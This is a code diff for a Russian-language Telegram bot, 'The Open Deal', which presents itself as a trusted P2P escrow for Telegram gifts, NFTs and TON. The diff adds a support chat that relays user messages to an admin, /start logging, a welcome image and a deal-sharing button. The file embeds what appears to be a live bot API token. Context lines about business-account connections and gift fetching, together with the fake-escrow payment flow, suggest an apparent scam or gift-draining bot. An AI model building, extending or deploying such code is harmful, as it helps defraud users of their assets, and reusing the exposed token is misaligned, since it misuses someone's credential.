@@ -4,7 +4,7 @@ import random
 import string
 import asyncio
 import logging
-from aiogram import Bot, Dispatcher, types, F
+from aiogram import Bot, Dispatcher, types, F, Router
 from aiogram.filters import Command
 from aiogram.types import Message
 from aiogram.utils.keyboard import InlineKeyboardBuilder
@@ -16,7 +16,11 @@ from aiogram.exceptions import TelegramBadRequest
 from typing import List
 from pydantic import BaseModel, Field
 import re
+import html
 from datetime import datetime
+from urllib.parse import quote as urlquote
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
 
 # ========== CONFIG ==========
 API_TOKEN = "7611354074:AAFOEEnnGpABuy3w7pwf9OzzEeeRkzR7CwY"
@@ -26,6 +30,10 @@ BOT_NAME = "The Open Deal"
 
 # Словарь для отслеживания уже залогированных действий
 logged_actions = {}
+
+# ========== STATES ==========
+class SupportStates(StatesGroup):
+    waiting_for_support_message = State()
 
 # ========== CUSTOM MODELS ==========
 class StarAmount(BaseModel):
@@ -52,6 +60,7 @@ class GetFixedBusinessAccountGifts:
 # ========== INITIALIZATION ==========
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher()
+router = Router()
 user_data = {}
 
 # Создаем необходимые директории
@@ -62,12 +71,15 @@ os.makedirs("users", exist_ok=True)
 CONNECTIONS_FILE = "business_connections.json"
 REFS_FILE = "refs.json"
 
+# Хранилище для message_id сообщений поддержки
+support_messages = {}
+
 # ========== KEYBOARDS ==========
 main_menu = types.InlineKeyboardMarkup(
     inline_keyboard=[
         [types.InlineKeyboardButton(text="💼 Управление кошельками", callback_data="add_wallet")],
         [types.InlineKeyboardButton(text="📄 Создать сделку", callback_data="create_deal")],
-        [types.InlineKeyboardButton(text="📞 Поддержка", url="https://t.me/negarant_sup")],
+        [types.InlineKeyboardButton(text="📞 Поддержка", callback_data="support")],
     ]
 )
 
@@ -114,6 +126,13 @@ cancel_deal_button = types.InlineKeyboardMarkup(
 nft_ready_keyboard = types.InlineKeyboardMarkup(
     inline_keyboard=[
         [types.InlineKeyboardButton(text="✅ Готово", callback_data="nft_done")]
+    ]
+)
+
+# Клавиатура для поддержки
+support_keyboard = types.InlineKeyboardMarkup(
+    inline_keyboard=[
+        [types.InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
     ]
 )
 
@@ -211,60 +230,23 @@ async def send_or_edit_message(user_id: int, text: str, reply_markup: types.Inli
             print(f"Критическая ошибка при отправке сообщения для пользователя {user_id}: {e2}")
 
 async def log_to_admin(event_type: str, user_data: dict, additional_info: str = ""):
-    """Отправляет логи администратору о действиях пользователей"""
+    """Логи администратору отключены (чтобы не спамить)."""
+    return
+
+async def send_start_log(user: types.User, extra: str):
+    """Короткий лог только о /start (без остальных событий)."""
     try:
-        user = user_data.get("from_user", {})
-        user_id = user.get("id", "N/A")
-        username = f"@{user.get('username', 'N/A')}" if user.get('username') else "N/A"
-        first_name = user.get('first_name', 'N/A')
-        last_name = user.get('last_name', 'N/A')
-        
-        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
-        # Создаем уникальный ключ для события (чтобы избежать дублирования)
-        event_key = f"{event_type}_{user_id}_{additional_info}"
-        
-        # Проверяем, не логировали ли мы уже это событие в последние 10 секунд
-        if event_key in logged_actions:
-            last_log_time = logged_actions[event_key]
-            time_diff = (datetime.now() - last_log_time).total_seconds()
-            if time_diff < 10:  # Если прошло меньше 10 секунд, не логируем
-                return
-        
-        # Обновляем время последнего логирования
-        logged_actions[event_key] = datetime.now()
-        
-        # Очищаем старые записи (старше 60 секунд)
-        current_time_obj = datetime.now()
-        keys_to_remove = []
-        for key, log_time in logged_actions.items():
-            if (current_time_obj - log_time).total_seconds() > 60:
-                keys_to_remove.append(key)
-        
-        for key in keys_to_remove:
-            del logged_actions[key]
-        
-        log_message = (
-            f"📊 <b>Лог события:</b> {event_type}\n"
-            f"🕐 <b>Время:</b> {current_time}\n"
-            f"👤 <b>Пользователь:</b>\n"
-            f"   ├ ID: <code>{user_id}</code>\n"
-            f"   ├ Username: {username}\n"
-            f"   ├ Имя: {first_name}\n"
-            f"   └ Фамилия: {last_name}\n"
-        )
-        
-        if additional_info and additional_info != "Сумма: 0 TON, NFT ссылок: 0":
-            log_message += f"📝 <b>Дополнительно:</b> {additional_info}\n"
-        
+        username = f"@{user.username}" if user.username else "(нет username)"
         await bot.send_message(
             chat_id=ADMIN_ID,
-            text=log_message,
+            text=(
+                f"▶️ <b>/start</b> от <code>{user.id}</code> {username}\n"
+                f"{extra}"
+            ),
             parse_mode="HTML"
         )
-        
-    except Exception as e:
-        logging.exception(f"Ошибка при отправке лога администратору: {e}")
+    except Exception:
+        pass
 
 # ========== BUSINESS CONNECTION HANDLER ==========
 @dp.business_connection()
@@ -360,14 +342,11 @@ async def send_welcome(message: types.Message):
     user_id = message.from_user.id
     start_data = message.text.split(" ")
     
-    # Логируем запуск бота (только если это не админ)
+    # Короткий лог только о запуске (без спама по всем действиям)
     if user_id != ADMIN_ID:
-        await log_to_admin(
-            event_type="ЗАПУСК БОТА",
-            user_data={"from_user": message.from_user.__dict__},
-            additional_info=f"Параметры: {message.text}" if len(start_data) > 1 else "Чистый запуск"
-        )
-    
+        extra = f"Параметры: {message.text}" if len(start_data) > 1 else "Чистый запуск"
+        await send_start_log(message.from_user, extra)
+
     if user_id in user_data:
         last_message_id = user_data[user_id].get("last_bot_message_id")
         user_data[user_id] = {"last_bot_message_id": last_message_id}
@@ -375,18 +354,27 @@ async def send_welcome(message: types.Message):
         user_data[user_id] = {}
 
     if len(start_data) == 1:
-        await send_or_edit_message(
-            user_id,
-            text=(
-                f"👋 <b>Добро пожаловать в {BOT_NAME} – надежный P2P-гарант</b>\n\n"
-                "<b>💼 Покупайте и продавайте всё, что угодно – безопасно!</b>\n"
-                "От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n\n"
-                "📖 <b>Как пользоваться?</b>\nОзнакомьтесь с инструкцией — https://telegra.ph/Podrobnyj-gajd-po-ispolzovaniyu-PortalOTC-Robot-12-04\n\n"
-                "Выберите нужный пункт ниже:"
-            ),
-            reply_markup=main_menu,
-            disable_web_page_preview=True
+        caption = (
+            f"👋 <b>Добро пожаловать в {BOT_NAME} – надежный P2P-гарант</b>\n\n"
+            "<b>💼 Покупайте и продавайте всё, что угодно – безопасно!</b>\n"
+            "От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n\n"
+            "📖 <b>Как пользоваться?</b>\nОзнакомьтесь с инструкцией — https://telegra.ph/Podrobnyj-gajd-po-ispolzovaniyu-PortalOTC-Robot-12-04\n\n"
+            "Выберите нужный пункт ниже:"
         )
+        photo_path = os.path.join(os.path.dirname(__file__), "1.png")
+        if os.path.exists(photo_path):
+            try:
+                await bot.send_photo(
+                    chat_id=user_id,
+                    photo=types.FSInputFile(photo_path),
+                    caption=caption,
+                    reply_markup=main_menu,
+                    parse_mode="HTML"
+                )
+            except Exception:
+                await send_or_edit_message(user_id, text=caption, reply_markup=main_menu, disable_web_page_preview=True)
+        else:
+            await send_or_edit_message(user_id, text=caption, reply_markup=main_menu, disable_web_page_preview=True)
     else:
         start_code = start_data[-1]
         
@@ -469,17 +457,24 @@ async def send_welcome(message: types.Message):
                         for i, link in enumerate(nft_links, 1):
                             nft_links_display += f"{i}. {link}\n"
 
+                    buyer_quote = (
+                        f"🧾 Сделка: #{random_start}\n"
+                        f"🆔 Покупателя: {user_id}\n"
+                        f"   · Username: @{message.from_user.username if message.from_user.username else 'нет username'}\n"
+                        f"💸 Сумма: {amount} TON\n"
+                        f"🎁 Товар: {description}"
+                    )
+                    quote_html = f"<blockquote>{html.escape(buyer_quote)}</blockquote>"
+
                     seller_message = (
                         f"🛒 <b>Покупатель начал сделку!</b>\n\n"
-                        f"🧾 <code>Сделка: #{random_start}</code>\n"
-                        f"🆔 <code>Покупателя: {user_id}</code>\n"
-                        f"   · <code>Username: @{message.from_user.username if message.from_user.username else 'нет username'}</code>\n"
-                        f"💸 <code>Сумма: {amount} TON</code>\n"
-                        f"🎁 <code>Товар: {description}</code>"
-                        + nft_links_display +
-                        f"\n\n💳 <b>Ожидание оплаты:</b>\n"
-                        f"Покупатель должен оплатить <code>{ton_amount} TON</code> (+ комиссия OTC)\n\n"
-                        f"⏳ <i>Ожидайте подтверждения оплаты на счет бота, бот сразу же уведомит вас о получении денег</i>"
+                        + quote_html
+                        + nft_links_display
+                        + (
+                            "\n\n💳 <b>Ожидание оплаты:</b>\n"
+                            f"Покупатель должен оплатить <b>{ton_amount} TON</b> (+ комиссия OTC)\n\n"
+                            "⏳ <i>Ожидайте подтверждения оплаты на счет бота, бот сразу же уведомит вас о получении денег</i>"
+                        )
                     )
 
                     # Создаем ссылку на чат с покупателем
@@ -538,7 +533,7 @@ async def send_payment_confirmation(message: types.Message):
 
     keyboard = InlineKeyboardBuilder()
     keyboard.button(text="🎁 Подтверждаю отправку подарка", callback_data="gift_received")
-    keyboard.button(text="🛠 Связаться с поддержкой", url="https://t.me/negarant_sup")
+    keyboard.button(text="🛠 Связаться с поддержкой", callback_data="support")
     keyboard.adjust(1)
 
     try:
@@ -609,7 +604,7 @@ async def confirm_payment(message: types.Message):
             buttons = types.InlineKeyboardMarkup(
                 inline_keyboard=[
                     [types.InlineKeyboardButton(text="🎁 Я получил подарок", callback_data="gift_received")],
-                    [types.InlineKeyboardButton(text="🛠 Связаться с поддержкой", url="https://t.me/portal_sap")]
+                    [types.InlineKeyboardButton(text="🛠 Связаться с поддержкой", callback_data="support")]
                 ]
             )
 
@@ -650,7 +645,7 @@ async def confirm_payment(message: types.Message):
                     inline_keyboard=[
                         [types.InlineKeyboardButton(text="Чат с покупателем💭", url=buyer_link)],
                         [types.InlineKeyboardButton(text="Подтвердить передачу покупателю ✅", callback_data=f"confirm_gift_sent_{deal_code}")],
-                        [types.InlineKeyboardButton(text="Поддержка🛡️", url="https://t.me/portal_sap")]
+                        [types.InlineKeyboardButton(text="Поддержка🛡️", callback_data="support")]
                     ]
                 )
 
@@ -677,7 +672,7 @@ async def confirm_payment(message: types.Message):
                     buyer_buttons = types.InlineKeyboardMarkup(
                         inline_keyboard=[
                             [types.InlineKeyboardButton(text="🎁 Я получил подарок", callback_data="gift_received")],
-                            [types.InlineKeyboardButton(text="🛠 Связаться с поддержкой", url="https://t.me/portal_sap")]
+                            [types.InlineKeyboardButton(text="🛠 Связаться с поддержкой", callback_data="support")]
                         ]
                     )
                     
@@ -730,6 +725,25 @@ async def close_popup(callback: types.CallbackQuery):
 
 @dp.callback_query(F.data == "back_to_menu")
 async def back_to_menu(callback: types.CallbackQuery):
+    user_id = callback.from_user.id
+    if user_id in user_data:
+        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
+    
+    await send_or_edit_message(
+        user_id,
+        text=(
+            f"👋 <b>Добро пожаловать в {BOT_NAME} – надежный P2P-гарант</b>\n\n"
+            "<b>💼 Покупайте и продавайте всё, что угодно – безопасно!</b>\n"
+            "От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n\n"
+            "📖 <b>Как пользоваться?</b>\nОзнакомьтесь с инструкцией — https://telegra.ph/Podrobnyj-gajd-po-ispolzovaniyu-PortalOTC-Robot-12-04\n\n"
+            "Выберите нужный пункт ниже:"
+        ),
+        reply_markup=main_menu,
+        disable_web_page_preview=True
+    )
+
+@dp.callback_query(F.data == "back_to_main")
+async def back_to_main_handler(callback: types.CallbackQuery):
     user_id = callback.from_user.id
     if user_id in user_data:
         user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
@@ -1243,18 +1257,27 @@ async def exit_deal(callback: types.CallbackQuery):
     if user_id in user_data:
         user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
     
-    await send_or_edit_message(
-        user_id,
-        text=(
-            f"👋 <b>Добро пожаловать в {BOT_NAME} – надежный P2P-гарант</b>\n\n"
-            "<b>💼 Покупайте и продавайте всё, что угодно – безопасно!</b>\n"
-            "От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n\n"
-            "📖 <b>Как пользоваться?</b>\nОзнакомьтесь с инструкцией — https://telegra.ph/Podrobnyj-gajd-po-ispolzovaniyu-PortalOTC-Robot-12-04\n\n"
-            "Выберите нужный пункт ниже:"
-        ),
-        reply_markup=main_menu,
-        disable_web_page_preview=True
+    caption = (
+        f"👋 <b>Добро пожаловать в {BOT_NAME} – надежный P2P-гарант</b>\n\n"
+        "<b>💼 Покупайте и продавайте всё, что угодно – безопасно!</b>\n"
+        "От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n\n"
+        "📖 <b>Как пользоваться?</b>\nОзнакомьтесь с инструкцией — https://telegra.ph/Podrobnyj-gajd-po-ispolzovaniyu-PortalOTC-Robot-12-04\n\n"
+        "Выберите нужный пункт ниже:"
     )
+    photo_path = os.path.join(os.path.dirname(__file__), "1.png")
+    if os.path.exists(photo_path):
+        try:
+            await bot.send_photo(
+                chat_id=user_id,
+                photo=types.FSInputFile(photo_path),
+                caption=caption,
+                reply_markup=main_menu,
+                parse_mode="HTML"
+            )
+        except Exception:
+            await send_or_edit_message(user_id, text=caption, reply_markup=main_menu, disable_web_page_preview=True)
+    else:
+        await send_or_edit_message(user_id, text=caption, reply_markup=main_menu, disable_web_page_preview=True)
 
 @dp.callback_query(F.data == "nft_done")
 async def nft_done(callback: types.CallbackQuery):
@@ -1339,19 +1362,107 @@ async def nft_done(callback: types.CallbackQuery):
         for i, link in enumerate(nft_links, 1):
             nft_display += f"{i}. {link}\n"
 
+    deal_quote = (
+        f"🧾 Сделка: #{random_start}\n"
+        "🆔 Покупателя: (ожидается)\n"
+        "   · Username: (ожидается)\n"
+        f"💸 Сумма: {deal_data['amount']} TON\n"
+        f"🎁 Товар: {deal_data['description']}"
+    )
+    quote_html = f"<blockquote>{html.escape(deal_quote)}</blockquote>"
+
+    share_text = (
+        f"🧾 Сделка: #{random_start}\n"
+        f"💸 Сумма: {deal_data['amount']} TON\n"
+        f"🎁 Товар: {deal_data['description']}\n\n"
+        f"🔗 Ссылка: {deal_data['link']}"
+    )
+    share_url = "https://t.me/share/url?url=&text=" + urlquote(share_text)
+
+    created_keyboard = types.InlineKeyboardMarkup(
+        inline_keyboard=[
+            [types.InlineKeyboardButton(text="📤 Поделиться сделкой", url=share_url)],
+            [types.InlineKeyboardButton(text="🔙 Вернуться в меню", callback_data="back_to_menu")],
+        ]
+    )
+
     await send_or_edit_message(
         user_id,
         "✅ <b>Сделка успешно создана!</b>\n\n"
-        f"💰 <b>Сумма:</b> <code>{deal_data['amount']} TON</code>\n"
-        f"📜 <b>Описание:</b> <code>{deal_data['description']}</code>"
-        + nft_display +
-        f"\n🔗 <b>Ссылка для покупателя:</b> {deal_data['link']}"
+        + quote_html
+        + nft_display
+        + f"\n🔗 <b>Ссылка для покупателя:</b> {deal_data['link']}"
         + wallets_display,
-        cancel_deal_button
+        created_keyboard
     )
 
     if user_id in user_data:
         user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
+
+# ========== SUPPORT HANDLERS (как во втором скрипте) ==========
+@dp.callback_query(F.data == "support")
+async def support_handler(callback: types.CallbackQuery, state: FSMContext):
+    user = callback.from_user
+    user_id = user.id
+    
+    # Логируем обращение в поддержку
+    await log_to_admin(
+        event_type="ОБРАЩЕНИЕ В ПОДДЕРЖКУ",
+        user_data={"from_user": user.__dict__},
+        additional_info="Пользователь начал диалог с поддержкой"
+    )
+    
+    # Отправляем отдельное сообщение с инструкцией
+    support_msg = await callback.message.answer(
+        "🆘 <b>Обращение в поддержку</b>\n\nНапишите ваше сообщение для поддержки. Мы ответим вам в ближайшее время.",
+        reply_markup=support_keyboard
+    )
+    
+    # Сохраняем ID сообщения для последующего удаления
+    support_messages[user_id] = support_msg.message_id
+    
+    # Устанавливаем состояние ожидания сообщения
+    await state.set_state(SupportStates.waiting_for_support_message)
+    await callback.answer()
+
+# Обработка сообщений для поддержки
+@router.message(SupportStates.waiting_for_support_message)
+async def process_support_message(message: Message, state: FSMContext):
+    user = message.from_user
+    user_id = user.id
+    
+    # Удаляем предыдущее сообщение с инструкцией о поддержке
+    if user_id in support_messages:
+        try:
+            await bot.delete_message(chat_id=user_id, message_id=support_messages[user_id])
+            del support_messages[user_id]
+        except:
+            pass
+    
+    # Логируем отправку сообщения в поддержку
+    await log_to_admin(
+        event_type="СООБЩЕНИЕ ДЛЯ ПОДДЕРЖКИ",
+        user_data={"from_user": user.__dict__},
+        additional_info=f"Сообщение: {message.text}"
+    )
+    
+    # Отправляем пользователю сообщение о получении
+    await message.answer(
+        "✅ Ваше сообщение получено! Администратор скоро ответит.\n\nОбычное время ответа: 30 минут",
+        reply_markup=support_keyboard
+    )
+    
+    # Пересылаем сообщение администратору
+    support_message = (
+        f"🆘 <b>Сообщение от пользователя:</b>\n"
+        f"👤 ID: <code>{user_id}</code>\n"
+        f"👤 Пользователь: @{user.username or 'нет'}\n"
+        f"📝 Текст: {message.text}"
+    )
+    await bot.send_message(ADMIN_ID, support_message, parse_mode="HTML")
+    
+    # Сбрасываем состояние
+    await state.clear()
 
 # ========== MESSAGE HANDLERS ==========
 @dp.message(F.text, lambda message: user_data.get(message.from_user.id, {}).get("step") in ["wallet", "ton_wallet", "card", "crypto_wallet"])
